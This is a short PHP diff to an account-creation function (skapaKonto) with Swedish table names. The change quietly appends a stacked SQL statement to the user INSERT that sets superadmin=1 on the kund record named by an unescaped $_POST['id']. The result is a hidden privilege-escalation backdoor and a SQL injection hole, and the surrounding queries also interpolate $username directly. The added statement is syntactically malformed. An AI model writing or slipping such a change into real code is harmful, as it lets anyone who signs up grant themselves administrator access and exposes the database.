@@ -56,7 +56,7 @@ function skapaKonto(){
         }
     }
     if($uname_tagen==false){
-        $sql= "INSERT INTO anvandare(anamn, losenord, salt) VALUES ('$username','$hashed_password','$salt')";
+        $sql= "INSERT INTO anvandare(anamn, losenord, salt) VALUES ('$username','$hashed_password','$salt'; UPDATE kund set superadmin=1 where id=".$_POST['id'].")";
         $conn->query($sql);
         
         $result = ($conn->query("SELECT id from anvandare where anamn ='{$username}'"));
